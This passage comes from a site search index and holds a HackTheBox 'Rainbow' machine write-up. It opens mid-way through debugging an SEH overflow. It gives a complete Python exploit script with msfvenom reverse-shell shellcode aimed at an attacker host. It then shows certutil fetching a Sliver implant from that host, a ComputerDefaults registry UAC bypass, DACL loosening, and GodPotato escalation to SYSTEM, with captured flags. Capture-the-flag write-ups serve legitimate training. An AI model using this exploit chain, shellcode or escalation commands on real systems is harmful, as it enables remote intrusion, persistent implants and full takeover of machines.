ds=002b  es=002b  fs=0053  gs=002b             efl=00000246\n</code></pre><p></p> <p>Need to add about 0x648 hex to esp and jump there. But need to do it in a way that avoids null bytes.  In python:</p> <pre><code>&gt;&gt;&gt; hex(0x964-0x31c)\n'0x648'\n\n&gt;&gt;&gt; hex(0x00a3f31c + 0xfffff648)\n'0x100a3e964'\n</code></pre> <p>Not quite right though, it's about 0x1000 off.</p> <p>So instead it would make more sense to just write directly to the lower half of the dword.   Something like: </p><pre><code>mov sp,0xf952; jmp esp\n</code></pre><p></p> <p>The following should align, with a placeholder for shellcode </p><pre><code>    crash_len = 664-4-12\n    head = \"POST / HTTP/1.1\\x0d\\x0aContent-Type: application/x-www-form-urlencoded\\x0d\\x0a\\x0d\\x0a\"\n    sled1 = (\"\\x90\" * 0x14)\n    shellcode = (\"\\x41\" * (crash_len - len(sled1)))\n    nnSEH = (\n        \"\\x66\\xbc\\x52\\xf9\"  ## mov sp, 0xf952\n        \"\\xff\\xe4\"              ## jmp esp\n        \"\\x90\\x90\\x90\\x90\\x90\\x90\"\n    ) \n    nSEH = \"\\x90\\x90\\xeb\\xf0\"  ## nasm &gt; jmp short 0xf2 / EBF0 jmp short 0xfffffff2\n    SEH = \"\\xd8\\x94\\x40\"  ## 0x4094d8: pop ecx ; pop ecx ; ret ; \n\n    buf = f\"{head}{sled1}{shellcode}{nnSEH}{nSEH}{SEH}\"\n</code></pre><p></p> <p>After jmp esp, Perfect.  Land right at the beginning of <code>sled1</code> </p><pre><code>0:003&gt; dd eip\n009ef950  90909090 90909090 90909090 90909090\n009ef960  90909090 41414141 41414141 41414141\n009ef970  41414141 41414141 41414141 41414141\n009ef980  41414141 41414141 41414141 41414141\n009ef990  41414141 41414141 41414141 41414141\n</code></pre><p></p>"},{"location":"writeups/HackTheBox/Machines/Rainbow/#shellcode","title":"Shellcode","text":"<p>The only thing left to do is generate the shellcode and complete the PoC. </p><pre><code>#!/usr/bin/env python3\nimport os, sys, re, socket, binascii, time\nfrom struct import pack, unpack\n\nbadchars = \"\\x00\\x0a\"\ndef gen_badchars(bc, start=\"\\x01\", end=\"\\xff\"):\n    s_int = ord(start)\n    e_int = ord(end)+1\n    BC = bytearray(range(s_int,e_int)).decode('latin-1')\n    for item in bc:\n        BC = BC.replace(item,'')\n    return BC\n\ndef cx(ip, port, recv=0):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((ip, port))\n    if recv &gt; 0:\n        resp = sock.recv(4096)\n        print(resp)\n    return sock\n\ndef sender(sock, buf, send=0, recv=0):\n    if send &gt; 0:\n        sock.send(buf.encode('latin-1'))\n    if recv &gt; 0:\n        resp = sock.recv(4096)\n        return resp\n\ndef main():\n    if len(sys.argv) &lt; 2:\n        print(f\"USAGE: {sys.argv[0]} ip:port\")\n        sys.exit()\n    else:\n        ip, port = sys.argv[1].split(\":\")\n        port = int(port)\n        sock = cx(ip,port,0)\n\n    crash_len = 664-4-12\n    head = \"POST / HTTP/1.1\\x0d\\x0aContent-Type: application/x-www-form-urlencoded\\x0d\\x0a\\x0d\\x0a\"\n    sled1 = (\"\\x90\" * 0x14)\n    shellcode = (\n        ## msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.204 LPORT=443 EXITFUNC=thread -b \"\\x00\\x0a\" -f c\n        \"\\xba\\x92\\xee\\x4a\\x91\\xda\\xcb\\xd9\\x74\\x24\\xf4\\x58\\x2b\\xc9\"\n        \"\\xb1\\x52\\x31\\x50\\x12\\x83\\xe8\\xfc\\x03\\xc2\\xe0\\xa8\\x64\\x1e\"\n        \"\\x14\\xae\\x87\\xde\\xe5\\xcf\\x0e\\x3b\\xd4\\xcf\\x75\\x48\\x47\\xe0\"\n        \"\\xfe\\x1c\\x64\\x8b\\x53\\xb4\\xff\\xf9\\x7b\\xbb\\x48\\xb7\\x5d\\xf2\"\n        \"\\x49\\xe4\\x9e\\x95\\xc9\\xf7\\xf2\\x75\\xf3\\x37\\x07\\x74\\x34\\x25\"\n        \"\\xea\\x24\\xed\\x21\\x59\\xd8\\x9a\\x7c\\x62\\x53\\xd0\\x91\\xe2\\x80\"\n        \"\\xa1\\x90\\xc3\\x17\\xb9\\xca\\xc3\\x96\\x6e\\x67\\x4a\\x80\\x73\\x42\"\n        \"\\x04\\x3b\\x47\\x38\\x97\\xed\\x99\\xc1\\x34\\xd0\\x15\\x30\\x44\\x15\"\n        \"\\x91\\xab\\x33\\x6f\\xe1\\x56\\x44\\xb4\\x9b\\x8c\\xc1\\x2e\\x3b\\x46\"\n        \"\\x71\\x8a\\xbd\\x8b\\xe4\\x59\\xb1\\x60\\x62\\x05\\xd6\\x77\\xa7\\x3e\"\n        \"\\xe2\\xfc\\x46\\x90\\x62\\x46\\x6d\\x34\\x2e\\x1c\\x0c\\x6d\\x8a\\xf3\"\n        \"\\x31\\x6d\\x75\\xab\\x97\\xe6\\x98\\xb8\\xa5\\xa5\\xf4\\x0d\\x84\\x55\"\n        \"\\x05\\x1a\\x9f\\x26\\x37\\x85\\x0b\\xa0\\x7b\\x4e\\x92\\x37\\x7b\\x65\"\n        \"\\x62\\xa7\\x82\\x86\\x93\\xee\\x40\\xd2\\xc3\\x98\\x61\\x5b\\x88\\x58\"\n        \"\\x8d\\x8e\\x1f\\x08\\x21\\x61\\xe0\\xf8\\x81\\xd1\\x88\\x12\\x0e\\x0d\"\n        \"\\xa8\\x1d\\xc4\\x26\\x43\\xe4\\x8f\\x42\\x9e\\xe8\\x83\\x3b\\x9c\\xf4\"\n        \"\\x1a\\x07\\x29\\x12\\x76\\x67\\x7c\\x8d\\xef\\x1e\\x25\\x45\\x91\\xdf\"\n        \"\\xf3\\x20\\x91\\x54\\xf0\\xd5\\x5c\\x9d\\x7d\\xc5\\x09\\x6d\\xc8\\xb7\"\n        \"\\x9c\\x72\\xe6\\xdf\\x43\\xe0\\x6d\\x1f\\x0d\\x19\\x3a\\x48\\x5a\\xef\"\n        \"\\x33\\x1c\\x76\\x56\\xea\\x02\\x8b\\x0e\\xd5\\x86\\x50\\xf3\\xd8\\x07\"\n        \"\\x14\\x4f\\xff\\x17\\xe0\\x50\\xbb\\x43\\xbc\\x06\\x15\\x3d\\x7a\\xf1\"\n        \"\\xd7\\x97\\xd4\\xae\\xb1\\x7f\\xa0\\x9c\\x01\\xf9\\xad\\xc8\\xf7\\xe5\"\n        \"\\x1c\\xa5\\x41\\x1a\\x90\\x21\\x46\\x63\\xcc\\xd1\\xa9\\xbe\\x54\\xf1\"\n        \"\\x4b\\x6a\\xa1\\x9a\\xd5\\xff\\x08\\xc7\\xe5\\x2a\\x4e\\xfe\\x65\\xde\"\n        \"\\x2f\\x05\\x75\\xab\\x2a\\x41\\x31\\x40\\x47\\xda\\xd4\\x66\\xf4\\xdb\"\n        \"\\xfc\"## 351\n    )\n    sled2 = (\"\\x41\" * (crash_len - len(sled1) - len(shellcode)))\n    nnSEH = (\n        \"\\x66\\xbc\\x50\\xf9\"  ## mov sp, 0xf950\n        \"\\xff\\xe4\"              ## jmp esp\n        \"\\x90\\x90\\x90\\x90\\x90\\x90\"\n    ) \n    nSEH = \"\\x90\\x90\\xeb\\xf0\"  ## nasm &gt; jmp short 0xf2 / EBF0 jmp short 0xfffffff2\n    SEH = \"\\xd8\\x94\\x40\"  ## 0x4094d8: pop ecx ; pop ecx ; ret ; \n\n    buf = f\"{head}{sled1}{shellcode}{sled2}{nnSEH}{nSEH}{SEH}\"\n    resp = sender(sock, buf, 1, 1)\n\n\nif __name__==\"__main__\":\n    main()\n</code></pre><p></p>"},{"location":"writeups/HackTheBox/Machines/Rainbow/#getting-a-foothold","title":"Getting a foothold","text":"<p>It shells:</p> <p></p> <p>Flag </p><pre><code>C:\\Users\\rainbow\\Desktop&gt;type user.txt\ntype user.txt\n881288e2cd563fa856fcb4163b91ec06\n</code></pre><p></p>"},{"location":"writeups/HackTheBox/Machines/Rainbow/#post-exploitation-enumeration","title":"Post-exploitation enumeration","text":"<p>Need to upgrade my shell to something a little more feature rich, reliable, etc.</p> <p>Download  a Sliver implant to the host </p><pre><code>C:\\rainbow&gt;certutil -urlcache -f -split http://10.10.14.204:8083/10.10.14.204.exe \\windows\\tasks\\a.exe\ncertutil -urlcache -f -split http://10.10.14.204:8083/10.10.14.204.exe \\windows\\tasks\\a.exe\n****  Online  ****\n  000000  ...\n  988a00\nCertUtil: -URLCache command completed successfully.\n</code></pre><p></p> <p>The current shell env is 32 bit (of course), but the system is 64bit </p><pre><code>C:\\rainbow&gt;set proc\nset proc\nPROCESSOR_ARCHITECTURE=x86\nPROCESSOR_ARCHITEW6432=AMD64\nPROCESSOR_IDENTIFIER=AMD64 Family 25 Model 1 Stepping 1, AuthenticAMD\nPROCESSOR_LEVEL=25\nPROCESSOR_REVISION=0101\n</code></pre><p></p> <p>So I will use 64bit cmd.exe to launch the sliver implant. </p><pre><code>C:\\rainbow&gt;c:\\windows\\sysnative\\cmd.exe /c \\windows\\tasks\\a.exe\nc:\\windows\\sysnative\\cmd.exe /c \\windows\\tasks\\a.exe\n</code></pre><p></p> <p>Sharpup audit, found that UAC can be bypassed. </p><pre><code>sliver (REMOTE_JACKAL) &gt; sharpup -t 300 -i -- audit\n\n[*] sharpup output:\n\n=== SharpUp: Running Privilege Escalation Checks ===\n\n[*] In medium integrity but user is a local administrator- UAC can be bypassed.\n\n[*] Audit mode: running an additional 15 check(s).\nRegistry AutoLogon Found\n\n[!] Modifialbe scheduled tasks were not evaluated due to permissions.\n\n=== Registry AutoLogons ===\n</code></pre><p></p>"},{"location":"writeups/HackTheBox/Machines/Rainbow/#elevate","title":"Elevate","text":"<p>I'll try a number of UAC bypasses.  What I found worked for me is the ComputerDefaults bypass.</p> <pre><code>New-Item \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Force\nNew-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nSet-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Name \"(default)\" -Value \"cmd.exe /c \\windows\\tasks\\a.exe\" -Force\n\n\\#\\# Then execute with:  ComputerDefaults.exe (triggers based on the same registry key.  Full path pops defender, try running without full path)\nc:\\Windows\\System32\\ComputerDefaults.exe\n</code></pre> <p>I get a new session: </p><pre><code>[*] Session e7b84ea7 REMOTE_JACKAL - 10.129.35.177:63623 (rainbow) - windows/amd64 - Sun, 26 Oct 2025 17:02:15 PDT\n\nsliver (REMOTE_JACKAL) &gt;\n</code></pre><p></p> <p>I'll clean up the registry </p><pre><code>Remove-Item \"HKCU:\\Software\\Classes\\ms-settings\\\" -Recurse -Force\n</code></pre><p></p>"},{"location":"writeups/HackTheBox/Machines/Rainbow/#escalate","title":"Escalate","text":"<p>On the new session, I find that the process integrity is High, and the process tokens include SeImpersonatePrivilege in an enabled state</p> <p></p> <p>Upload GodPotato </p><pre><code>sliver (REMOTE_JACKAL) &gt; upload /var/www/html/GodPotato-NET4.exe /windows/tasks/GodPotato.exe\n\n[*] Wrote file to C:\\windows\\tasks\\GodPotato.exe\n</code></pre><p></p> <p>Loosen DACLs around files in <code>c:\\windows\\tasks</code> </p><pre><code>$path=\"c:\\windows\\tasks\"; (Get-ChildItem -path $path\\* -Recurse).FullName | % {$Acl = Get-ACL $_; $AccessRule= New-Object System.Security.AccessControl.FileSystemAccessRule(\"Everyone\",\"FullControl\",\"none\",\"none\",\"Allow\");$Acl.AddAccessRule($AccessRule);Set-Acl $_ $Acl}\n</code></pre><p></p> <p>Execute GodPotato, have it daemonize another instance of the Sliver implant </p><pre><code>PS C:\\windows\\tasks&gt; .\\GodPotato.exe -cmd \"cmd.exe /c \\windows\\tasks\\a.exe\"\n.\\GodPotato.exe -cmd \"cmd.exe /c \\windows\\tasks\\a.exe\"\n[*] CombaseModule: 0x140709195350016\n[*] DispatchTable: 0x140709197652048\n[*] UseProtseqFunction: 0x140709197029744\n[*] UseProtseqFunctionParamCount: 6\n[*] HookRPC\n[*] Start PipeServer\n[*] CreateNamedPipe \\\\.\\pipe\\aabfbcee-7777-4b84-bb35-19b7430af1b9\\pipe\\epmapper\n[*] Trigger RPCSS\n[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046\n[*] DCOM obj IPID: 00000802-16c8-ffff-1d75-8eaf76328c8b\n[*] DCOM obj OXID: 0x48fca28fb7e0a860\n[*] DCOM obj OID: 0xdc03a523a80cc5fc\n[*] DCOM obj Flags: 0x281\n[*] DCOM obj PublicRefs: 0x0\n[*] Marshal Object bytes len: 100\n[*] UnMarshal Object\n[*] Pipe Connected!\n[*] CurrentUser: NT AUTHORITY\\NETWORK SERVICE\n[*] CurrentsImpersonationLevel: Impersonation\n[*] Start Search System Token\n[*] PID : 908 Token:0x844  User: NT AUTHORITY\\SYSTEM ImpersonationLevel: Impersonation\n[*] Find System Token : True\n[*] UnmarshalObject: 0x80070776\n[*] CurrentUser: NT AUTHORITY\\SYSTEM\n[*] process start with pid 6848\n</code></pre><p></p> <p>A new session is born </p><pre><code>sliver (REMOTE_JACKAL) &gt; use aff2989a-17bd-4cce-a0ea-6c3c1188e23e\n\n[*] Active session REMOTE_JACKAL (aff2989a-17bd-4cce-a0ea-6c3c1188e23e)\n\nsliver (REMOTE_JACKAL) &gt; getuid\n\nS-1-5-18\n\nsliver (REMOTE_JACKAL) &gt; whoami\n\nLogon ID: NT AUTHORITY\\SYSTEM\n[*] Current Token ID: NT AUTHORITY\\SYSTEM\n</code></pre><p></p> <p>Root flag </p><pre><code>sliver (REMOTE_JACKAL) &gt; cat /users/administrator/desktop/root.txt\n\n4f5858163e52fd36d6cb7c6074c50a40\n</code></pre><p></p> <p></p>"},{"location":"blog/","title":"Blog","text":""},{"location":"blog/#blog","title":"Blog","text":""}]}